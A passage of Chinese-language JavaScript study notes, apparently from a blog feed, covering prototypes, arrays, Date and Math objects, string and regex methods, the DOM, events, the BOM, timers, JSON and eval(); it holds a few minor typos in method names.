当函数以构造函数的形式调用时，它所创建的对象中都会有一个隐含的属性， 指向该构造函数的原型对象，我们可以通过__proto__来访问该属性 原型对象就相当于一个公共的区域，所有同一个类的实例都可以访问到这个原型对象， 我们可以将对象中共有的内容，统一设置到原型对象中 当我们访问对象的一个属性或方法时，它会先在对象自身中寻找，如果有直接使用， 如果没有则会去原型对象中寻找 以后我们创建构造函数时，可以将这些对象共有的属性和方法，统一添加到构造函数的原型对象中， 这样不用分别为每一个对象添加，也不会影响到全局作用域，就可以使每个对象都具有这些属性和方法了 使用in检查对象中是否含有某个属性时，如果对象中没有但是原型中有 会返回true 但是如果我们要检查 对象自身中是否含有该属性 则需要用对象的hasOwnProperty() 方法来检查 原型对象也是对象，所有它也有原型 当我们使用一个对象的属性或方法时，会先在自身中寻找， 自身中如果有，则直接使用， 如果没有则去原型对象中寻找，如果原型对象中有，则使用， 如果没有则去原型的原型中寻找 Object对象的原型没有原型，如果在Object原型中依然没有找到，则返回undefined 在页面中打印一个对象时，实际上是输出对象的toString()方法的返回值 垃圾回收（GC） - 程序运行过程中会产生垃圾，垃圾堆积过多，会导致程序变慢或内存溢出奔溃， 所有在程序运行中需要一个垃圾回收机制来处理程序垃圾 - 什么是程序垃圾？ 当一个对象没有任何的变量或属性对它进行引用，也永远无法操作该对象， 这个对象就是一个程序垃圾。 - 在js中拥有自动的垃圾回收机制，会自动将这些垃圾对象从内存中销毁， 我们不需要也不能进行垃圾回收的操作 - 我们需要做的只是要将不再使用的对象设置为null即可 数组(Arry) - 数组也是一个对象 - 它和我们普通对象功能类似，用来存储数据 - 数组中的元素可以是任意的数据类型 - 不同之处： 对象使用字符串作为属性名 数组使用数字作为索引操作元素 - 索引 从0开始的整数就是索引 - 数组的存储性能比普通对象要好，在开发中我们经常使用数组来存储一些数据 创建数组 var arr = new Array() 使用typeof 检查一个数组时，会返回object 向数组中添加元素 语法： 数组[索引] = 值 arr[0] = 100 读取数组中的元素 语法： 数组[索引] arr[0] 读取不存在的索引，不会报错，会返回undefined 获取数组的长度 - 可以使用length属性来获取数组的长度（元素的个数） 语法： 数组.length arr.length 对于连续的数组，使用length可以获取到数组的长度(元素的个数) 对于非连续的数组，使用length会获取到数组的最大的索引+1 尽量不创建非连续数组 向数组的最后一位添加元素 语法： 数组[arr.length] = 100 arr[arr.length] = 100 使用字面量来创建数组 语法： var arr = [] 使用字面量创建数组时，可以在创建时就指定数组中的元素 var arr = [1,2,3,4,5] 操作数组的方法 push() - 该方法可以向数组的末尾添加一个或多个元素，并返回数组的新的长度 - 可以将要添加的元素 作为参数传递，这样这些元素会自动添加到数组末尾 - 该方法会将数组新的长度作为返回值返回 pop() - 该方法可以删除数组的最后一个元素，并将被删除的元素作为返回值返回 unshift() - 向数组开头添加一个或多个元素，并返回新的数组长度 - 向前边插入元素以后，其他的元素索引会依次调整 shift() - 可以删除数组的第一个元素，并将被删除的元素作为返回值返回 slice() - 可以用来从数组提取指定元素 - 该方法不会改变元素数组，而是将截取到的元素封装到一个新数组中返回 - 参数： 1. 截取开始的位置的索引，包含开始索引 2. 截取结束的位置的索引，不包含结束索引 - 第二个参数可以省略不写，此时会截取从开始索引往后的所有元素 - 索引可以传递一个负值，如果传递一个负值，则从后往前计算 -1 代表倒数第一个 -2 代表倒数第二个 splice() - 可以用于删除数组中的指定元素 - 使用splice()会影响到原数组，会将指定元素从原数组中删除 并将被删除的元素作为返回值返回 - 参数： 第一个，表示开始位置的索引 第二个，表示删除的数量 第三个及以后 可以传递一些新的元素，这些元素将会自动插入到开始位置索引前边 concat() - 可以连接两个或多个数组，并将新的数组返回 - 该方法不会对原数组产生影响 join() - 该方法可以将数组转换为一个字符串 - 该方法不会对原数组产生影响，而是将转换后的字符串作为结果返回 - 再join() 中可以指定一个字符串作为参数，这个字符串将会成为数组中元素的连接符 如果不指定连接符，则默认,作为连接符 reverse() - 该方法用来反转数组（前面的去后边，后边的去前边） - 该方法会直接修改原数组 sort() - 可以用来对数组中的元素进行排序 - 也会影响原数组，默认会按照Unicode编码进行排序 forEach() 遍历数组 - 这个方法只支持IE8以上的浏览器 IE8及以下的浏览器均不支持该方法，所有如果需要兼容IE8，则不要使用forEach - 方法需要一个函数作为参数 - 像这种函数，由我们创建但是不由我们调用，我们称回调函数 - 数组中有几个元素函数就会执行几次，每次执行时，浏览器会将遍历到的元素 以实参的形式传递进来，我们可以定义形参，来读取这些内容 - 浏览器会在回调函数中传递三个参数： 第一个参数，就是当前正在遍历的元素 第二个参数，就是当前正在遍历的元素的索引 第三个参数，就是正在遍历的数组（整个数组对象） Date对象 - 在JS中使用Date对象来表示一个时间 创建一个Date对象 var d = new Date(); 创建一个指定的时间对象 日期的格式 月份/日/年 时:分:秒 var d2 = new Date(&quot;2/18/2011 11:10:30&quot;); 日期获取的几个方法 getDate() - 获取当前日期对象是几日 getDay() - 获取当前日期对象时周几 - 会返回一个0-6的值 0 表示周日 getMonth() - 获取当前时间对象的月份 - 会返回一个0-11的值 0 表示1月 getFullYear() - 获取当前日期对象的年份 getTime() - 获取当前日期对象的时间戳 - 时间戳，指的是从格林威治标准时间的1970年1月1日，0时0分0秒 到当前日期所花费的毫秒数（1秒 = 1000毫秒） - 计算机底层在保存时间时使用都是时间戳 Math对象 - Math和其他的对象不同，它不是一个构造函数， 它属于一个工具类不用创建对象，它里边封装了数学运算相关的属性和方法 - 比如 Math.PI 表示的圆周率 方法： abs() - 可以用来计算一个数的绝对值 Math.ceil() - 可以对一个数进行向上取整，小数位只有有值就自动进1 Math.floor() - 可以对一个数进行向下取整，小数部分会被舍掉 Math.round() - 可以对一个数进行四舍五入取整 Math.random() - 可以用来生成一个0-1之间的随机数 - 生成一个0-10的随机数 - 生成一个0-x之间的随机数 Math.round(Math.random()*x) - 生成一个1-10 - 生成一个x-y之间的随机数 Math.round(Math.random()*(y-x)+x) Math.max() 可以获取多个数中的最大值 Math.min() 可以获取多个数中的最小值 Math.pow(x,y) 返回x的y次幂 Math.sqrt() 用于对一个数进行开方运算 包装类 在JS中为我们提供了三个包装类，通过这三个包装类可以将基本数据类型的数据转换为对象 方法： String() - 可以将基本数据类型字符串转换为String对象 Number() - 可以将基本数据类型的数字转换为Number对象 Boolean() - 可以将基本数据类型的布尔值转换为Boolean对象 但是注意：我们在实际应用中不会使用基本数据类型的对象， 如果使用基本数据类型的对象，在做一些比较时可能会带来一些不可预期的结果 注意事项： 方法和属性只能添加给对象，不能添加给基本数据类型 当我们对一些基本数据类型的值去调用属性和方法时， 浏览器会临时使用包装类将其转换为对象，然后在调用对象的属性和方法 调用完以后，在将其转换为基本数据类型 操作字符串的相关方法 属性： length - 可以用来获取字符串的长度 方法： charAt() - 可以返回字符串中指定位置的字符 - 根据索引获取指定的字符 charCodeAt() - 获取指定位置字符的字符编码（Unicode编码） formCharCode() - 可以根据字符编码去获取字符 concat() - 可以用来连接两个或多个字符串 - 作用和+一样 indexof() - 该方法可以检索一个字符串中是否含有指定内容 - 如果字符串中含有该内容，则会返回其第一次出现的索引 如果没有找到指定的内容，则返回-1 - 可以指定一个第二个参数，指定开始查找的位置 lastIndexOf(); - 该方法的用法和indexOf()一样， 不同的是indexOf是从前往后找， 而lastIndexOf是从后往前找 - 也可以指定开始查找的位置 slice() - 可以从字符串中截取指定的内容 - 不会影响原字符串，而是将截取到内容返回 - 参数： 第一个，开始位置的索引（包括开始位置） 第二个，结束位置的索引（不包括结束位置） - 如果省略第二个参数，则会截取到后边所有的 - 也可以传递一个负数作为参数，负数的话将会从后边计算 substring() - 可以用来截取一个字符串，可以slice()类似 - 参数： - 第一个：开始截取位置的索引（包括开始位置） - 第二个：结束位置的索引（不包括结束位置） - 不同的是这个方法不能接受负值作为参数， 如果传递了一个负值，则默认使用0 - 而且他还自动调整参数的位置，如果第二个参数小于第一个，则自动交换 substr() - 用来截取字符串 - 参数： 1.截取开始位置的索引 2.截取的长度 split() - 可以将一个字符串拆分为一个数组 - 参数： -需要一个字符串作为参数，将会根据该字符串去拆分数组 toUpperCase() - 将一个字符串转换为大写并返回 toLowerCase() -将一个字符串转换为小写并返回 正则表达式 - 正则表达式用于定义一些字符串的规则， 计算机可以根据正则表达式，来检查一个字符串是否符合规则 获取将字符串中符合规则的内容提取出来 创建正则表达式的对象 使用构造函数创建正则对象 语法： var 变量 = new RegExp(&apos;正则表达式&apos;, &apos;匹配模式&apos;); 使用typeof检查正则对象，会返回object 使用字面量创建正则对象 var patt = /正则表达式/匹配模式 修饰符/匹配模式 i 执行对大小写不敏感的匹配 g 执行全局匹配（查找所有匹配而非在找到第一个匹配后停止） m 执行多行匹配 方括号 [abc] 查找方括号之间的任何字符 [^abc] 查找任何不在方括号之间的字符 [0-9] 查找任何从 0 到 9 的数字 [a-z] 查找任何从小写 a 到 小写 z 的字符 [A-Z] 查找任何从大写 A 到 大写 Z的字符 (reg|blue|green) 查找任何指定的选项 元字符 . 查找单个字符，除了换行和行结束符 \w 查找单词字符 \W 查找非单词字符 \d 查找数字 \D 查找非数字字符 \s 查找空白字符 \S 查找非空白字符 ... 量词 n+ 匹配任何包含至少一个 n 的字符串 n* 匹配任何包含零个或多个 n 的 字符串 n? 匹配任何包含零个或一个 n的 字符串 ... RegExp对象属性 global RegExp 对象是否具有标志g ignoreCase RegExp 对象是否具有标志i lastIndex 一个整数，标示开始下一次匹配的字符位置 multiline RegExp 对象是否具有标志 m 正则表达式的方法 compile() - 编译正则表达式 exec() - 匹配字符串中指定的值，返回找到的值，并确定其位置 test() - 使用这个方法可以用来检查一个字符串是否符合正则表达式的规则， 如果符合则返回true，否则返回false 支持正则表达式的String对象的方法 search() - 匹配与正则表达式想匹配的值 match() - 找到一个或多个正则表达式的匹配 replace() - 替换与正则表达式匹配的字串 split() - 把字符串分割为字符串数组(重点内容)DOM (全称 Document Object Model 文档对象模型) 核心思想：找对象，搞对象 - 文档 文档表示的就是整个的HTML网页文档 - 对象 对象表示将网页中的每个部分都转换为了一个对象 - 模型 使用模型来表示对象之间的关系，这样方便我们获取对象 节点(Node) - 构成HTML文档最基本的单元 常用节点分为四类 - 文档节点 整个HTML文档 - 元素节点 HTML文档中的HTML标签 - 属性节点 元素的属性 - 文本节点 HTML标签中的文本内容 获取元素节点 - 通过document对象调用 getElementById() - 通过id属性获取一个元素节点对象 getElementsByTagName() - 通过标签名获取一组元素节点对象 getElementsByName() - 通过name属性获取一组元素节点对象 获取元素节点的子节点 - 通过具体的元素节点调用 getElementsByTagName - 方法，返回当前节点的指定标签名后代节点 childNodes - 属性，表示当前节点的所有子节点 children - 属性， 表示当前节点的所有有元素节点 firstChild - 属性，表示当前节点的第一个子节点 lastChild - 属性，表示当前节点的最后一个子节点 获取父节点和兄弟节点 - 通过具体的节点调用 parentNode - 属性，表示当前节点的父节点 previousSibling - 属性，表示当前节点的前一个兄弟节点 nextSibling - 属性，表示当前节点的后一个兄弟节点 元素节点的属性 - 获取元素节点的值 元素对象.属性名 element.value element.id element.className - 设置元素节点的值 元素对象.属性名 = 新的值 element.value = &apos;值&apos; element.id = &apos;值&apos; element.className = &apos;值&apos; 其他属性 nodeValue - 文本节点可以通过nodeValue属性获取和设置文本节点的内容 innerHTML - 元素节点通过该属性获取和设置标签内部的html代码 DOM查询的其余方法 document.body 保存的是body的引用 document.documentElement 保存的是html根标签 document.all 代表页面中所有的元素 getElementByClassName() 根据元素的class属性值查询一组元素节点对象 但是该方法不支持IE8及以下的浏览器 getElementsByTagName() 可以指定标签名来获取页面中所有的指定标签 querySelector() - 需要一个选择器的字符串做为参数，可以根据一个css选择器来查询一个元素节点对象 - 支持IE8及以上 - 只返回唯一的一个元素，如果满足条件的元素有多个，也只会返回一个 querySelectorAll() - 该方法和querySelector()类似，不同的是它会将符合条件的元素封装到一个数组中返回 - 即使符合条件的元素只有一个，它也会返回数组 DOM增删改方法 document.createElement() - 可以用于创建一个元素节点对象 - 它需要一个标签名作为参数，将会根据该标签名创建元素节点对象 并将创建好的对象作为返回值返回 document.createTextNode() - 用来创建一个文本节点对象 - 需要一个文本内容作为参数，将会根据该内容创建文本节点，并将新的节点返回 appendChild() - 向一个父节点中添加一个新的子节点 - 用法： 父节点.appendChild(子节点); insertBefore() - 可以在指定的子节点前插入新的子节点 - 语法： 父节点.insertBefore(新节点, 旧节点); replaceChild() - 可以使用指定的子节点替换已有的子节点 - 语法： 父节点.replaceChild(新节点, 旧节点); removeChild() - 可以删除一个子节点 - 语法： 父节点.removeChild(子节点); 或 子节点.parentNode.removeChild(子节点); JS修改元素的样式 语法： 元素.style.样式名 = 样式值 注意事项： 如果CSS的样式名中含有-这种名称在JS中是不合法的， 比如background-color,要想使用，需要将这种样式名改 为驼峰命名法，去掉-，然后将-后的字母大写 说明： 通过style属性设置的样式都是内联样式，而内联样式有较高的 优先级，通过JS修改的样式往往会立即显示 但是如果在样式中写了!important, 则此时样式会有最高的优先级 即使通过js也不能覆盖该样式，此时将会导致JS修改样式失效 所以尽量不会为样式添加！important JS读取元素的样式 语法： 元素.style.样式名 说明： 通过style属性设置和读取的都是内联样式，无法读取样式表中的样式 JS读取元素当前显示的样式 - 通过currentStyle 和 getComputedStyle() 读取到的样式都只是只读的， 不能修改，如果要修改必须通过style属性 currentStyle 语法： 元素.currentStyle.样式名 说明： 它可以用来读取当前正在显示的样式，如果该元素没有设置该样式， 则获取它的默认值 注意事项： currentStyle只有IE浏览器支持，其他浏览器都不支持 getComputedStyle() 说明： 这个方法来获取元素当前的样式，这个方法是window的方法，可以直接使用 该方法会返回一个对象，对象中封装了当前元素对应的样式， 可通过对象.样式名来读取样式 如果获取的样式没有设置，则会获取到真实的值，而不是默认值 比如: 没有设置width，它不会获取到auto，而是一个长度 语法： getComputedStyle(box1, null) 参数： 第一个： 要获取样式的元素 第二个： 可以传递一个伪元素，一般都传null 注意事项： 该方法不支持IE8及以下的浏览器 事件(Event) 常用事件 onclick - 单击事件 onmousemove - 该事件将会在鼠标在元素中移动时被触发 onmousedown - 该事件将会在鼠标被按下时被触发 onmouseup - 该事件将会在鼠标被松开时触发 鼠标/键盘属性 clientX和clientY - 用于获取鼠标在当前的可见窗口的坐标 pageX和pageY - 用于获取鼠标相对于当前页面的坐标 但是这两个属性在IE8中不支持 事件的冒泡(Bubble) - 所谓的冒泡指的就是事件的向上传导，当后代元素上的事件被触发时，其祖先元素的相同事件也会触发 - 在开发中大部分情况冒泡都是有用的，如果不希望发生事件冒泡可以通过事件对象来取消冒泡 取消冒泡 可以将事件对象的cancelBubble设置为true, 即可取消冒泡 语法： event.cancelBubble = true; 事件的委派 - 指将事件统一绑定给元素的共同的祖先元素，这样当后代元素上的事件触发时，会一直冒泡到祖先元素 从而通过祖先元素的响应函数来处理事件。 - 事件委派是利用了冒泡，通过委派可以减少事件绑定的次数，提高程序的性能 关键点 target - event中的target表示的触发事件的对象 事件的绑定 addEventListener() - 特点： 可以绑定多个单击响应函数 - 这个方法不支持IE8以以下浏览器 - 通过这个方法可以为元素绑定响应函数 - 参数： 1. 事件的字符串，不要on onclick不要on 只要click 2. 回调函数，当事件触发时该函数会被调用 3. 是否在捕获阶段触发事件，需要一个布尔值，一般都传false attachEvent() - 在IE8中可以使用 - 绑定多个单击响应函数 - 参数： 1. 事件的字符串, 要on 2. 回调函数 - 这个方法也可以同时为一个事件绑定多个处理函数 不同的是它是后绑定先执行，执行顺序和addEventListener() 相反 事件的传播(了解) 取消浏览器的默认行为： 第一种方法： return false 第二种方法： event.preventDefault() 注意： IE8 不支持 鼠标事件 拖拽 注意事项： 当我么拖拽一个网页中的内容时，浏览器会默认去搜索引擎中搜索内容， 这个行为会导致拖拽功能的异常，这个是浏览器提供的默认行为， 如果不希望发生这个行为，则可以通过 return false 来取消默认行为 但是 不对IE8起作用 IE8解决方法： 使用setCapture() 方法 将所有的拖拽事件 捕获到 自己身上 setCaptrue() - 只有IE支持，但是火狐中调用时不会报错， 而如果使用chrom调用，会报错 releaseCapture() - 取消对事件的捕获 滚轮事件 onmousewheel - 鼠标滚轮的事件 ，会在滚轮滚动时触发 - 但是火狐不支持该属性 DOMMouseScroll - 鼠标滚轮的事件 - 可以支持火狐 - 但是该事件需要通过addEventListener() 函数来绑定 事件对象 event.wheelDelta - 可以获取鼠标滚轮滚动的方向 - 向上滚 120 向下滚 -120 - 这个属性在火狐中不支持 event.detail - 可以获取鼠标滚轮滚动的方向 - 支持火狐 - 向上滚 -3 向下滚 3 键盘事件 onkeydown - 按键被按下 - 对于onkeydown来说如果一直按着某个按键不松手，则事件会一直触发 当onkeydown连续触发时，第一次和第二次之间会间隔稍微长一点，其他都会非常快 这种设计是为了防止误操作发生 onkeyup - 按键被松开 键盘事件一般都会绑定给一些可以获取到焦点的对象或者是document 事件对象 event.keyCode - 获取按键的编码 altKey ctrlKey shiftKey - 这三个用来判断 alt ctrl 和 shift 是否被按下 如果按下则返回true，否则返回false (重点内容)BOM(浏览器对象模型) - BOM可以使我么通过js来操作浏览器 - 在BOM中为我们提供了一组对象，用来完成对浏览器的操作 - BOM对象 Window - 代表的是整个浏览器的窗口，同时window也是网页中的全局对象 Navigator - 代表的当前浏览器的信息，通过该对象可以来识别不同的浏览器 Location - 代表当前浏览器的地址栏信息，通过Location可以获取地址栏信息，或者操作浏览器跳转页面 History - 代表浏览器的历史记录，可以通过该对象来操作浏览器的历史记录 由于隐私原因，该对象不能获取到具体的历史记录，只能操作浏览器向前或向后翻页 而且该操作只在当成访问时有效 Screen - 代表用户的屏幕的信息，通过该对象可以获取到用户的显示器的相关的信息 - 这些BOM对象在浏览器中都是作为window对象的属性保存的， 可以通过window对象来使用，也可以直接使用 Navigator - 代表的当前浏览器的信息，通过该对象可以来识别不同的浏览器 - 由于历史原因，Navigator对象中大部分属性都已经不能帮助我们识别浏览器了 - 一般只会使用userAgent来判断浏览器的信息， userAgent是一个字符串，这个字符串中包含有用来描述浏览器信息的内容， 不同的浏览器会有不同的userAgent 属性 userAgent - 返回由客户机发送服务器的 user-agent 头部的值。 - 用法： Navigator.userAgent History - 对象可以用来操作浏览器向前或向后翻页 属性 length - 可以获取到当前访问的链接数量 方法 back() - 可以用来回退到上一个页面，作用和浏览器的回退按钮一样 forward() - 可以跳转下一个页面，作用和浏览器的前进按钮一样 go() - 可以用来跳转到指定的页面 - 它需要一个整数作为参数 1: 表示向前跳转一个页面 相当于forward() 2: 表示向前跳转两个页面 -1: 表示向后跳转一个页面 -2: 表向后跳转两个页面 Location - 该对象中封装了浏览器的地址栏的信息 - 直接输出location，则会获取到地址栏的信息(当前页面的完整路径) 属性 hostname - 设置或返回当前URL的主机名 方法 assign() - 用来跳转到其他的页面，作用和直接修改location一样 reload() - 用于重新加载当前页面，作用和刷新按钮一样 - 如果在方法中传递一个true，作为参数，则会强制清空缓存刷新页面 replace() - 可以使用一个新的页面替换当前页面，调用完毕也会跳转页面 不好生成历史记录，不能使用回退按钮回退 定时器 setInterval() - 定时调用 - 可以将一个函数，每隔一段时间执行一次 - 参数： 1. 回调函数，该函数会每隔一段时间被调用一次 2. 每次调用间隔的时间，单位是毫秒 - 返回值 返回一个Number类型的数据 这个数字用来作为定时器的唯一标识 setInterval(function(){}, 1000); clearInterval() - 用来关闭一个定时器 - 方法中需要一个定时器的标识作为参数，这样会关闭标识对应的定时器 延时调用 - 延时调用一个函数不马上执行，而是隔一段时间以后在执行，而且只会执行一次 - 延时调用与定时调用区别：定时调用会执行多次，而延时调用只会执行一次 - 说明：延时调用河定时调用实际上是可以互相代替的，在开发中可以根据自己需要去选择 setTimeout() - 用来开启一个延时调用 - 参数同定时调用一致 clearTimeout() - 用来关闭一个延时调用JSON(JS对象表示法) - js中的对象只有js自己认识，其他的语言都不认识 - JSON就是一个特殊格式的字符串，这个字符串可以被任意的语言所识别 并且可以转换为任意语言中的对象，JSON在开发中主要用来数据交互 - JSON - Javascript Object Notation JS对象表示法 - JSON 和 JS对象的格式一样，只不过JSON字符串中的属性名必须加双引号 其他的和JS语法一致 - JSON分类 1. 对象 {} 2. 数组 {} - JSON中允许的值 1. 字符串 2. 数值 3. 布尔值 4. null 5. 对象 6. 数组 - JSON的转换 - 将JSON字符串转换为JS中的对象 - 在JS中，为我们提供了一个工具类，就叫JSON 这个对象可以帮助我们将JSON转换为JS对象，也可以将一个JS对象转换为JSON - JSON --&gt; js对象 方法： JSON.parse() - 可以将JSON字符串转换为js对象 - 它需要一个JSON字符串作为参数， 会将该字符串转换为JS对象并返回 - js对象 --&gt; JSON 方法： JSON.stringify() - 可以将一个JS对象转换为JSON字符串 - 需要一个js对象作为参数，会返回一个JSON字符串 注意事项： JSON这个对象在IE7及以下的浏览器中不支持，有些浏览器中调用会报错 eval() - 这个函数可以用来执行一段字符串形式的JS代码，并将执行结果返回 - 如果使用eval()执行的字符串中含有{}, 它会将{}当成是代码块 如果不希望当成代码块来执行，则需要在字符串外加一个() - eval() 这个函数的功能很强大, 可以直接执行一个字符中的JS代码 但是在开发中尽量不要使用，首先它的执行性能比较差，然后它还存在安全隐患。]]></content>
      <categories>
        <category>Javascript</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>javascript学习</tag>
      </tags>
  </entry>
</search>
